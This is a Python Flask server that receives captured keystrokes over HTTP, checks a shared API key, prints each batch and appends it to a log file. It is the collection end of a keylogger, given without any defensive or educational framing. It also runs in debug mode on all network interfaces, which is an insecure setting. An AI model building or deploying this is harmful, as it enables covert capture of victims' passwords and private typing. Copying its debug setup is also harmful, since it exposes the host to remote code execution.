from flask import Flask, request, abort

app = Flask(__name__)

# Define your secure API key
API_KEY = "your_secure_api_key"

# Endpoint to receive keystroke data
@app.route('/receive_keystrokes', methods=['POST'])
def receive_keystrokes():
    # Verify the API key in the request header
    api_key = request.headers.get('x-api-key')
    if api_key != API_KEY:
        abort(403, "Forbidden: Invalid API Key.")
    
    # Extract keystroke data from the request body
    keystroke_data = request.data.decode('utf-8')
    
    # Log the received data to the console
    print("Received Keystroke Data:")
    print(keystroke_data)
    
    # Save the keystroke data to a file
    with open("received_keystrokes.log", "a") as log_file:
        log_file.write(keystroke_data)
        log_file.write("\n")  # Add a newline for readability
    
    # Respond to the client
    return 'Data received successfully.', 200

if __name__ == '__main__':
    # Run the Flask application, listening on all interfaces
    app.run(host='0.0.0.0', port=8080, debug=True)
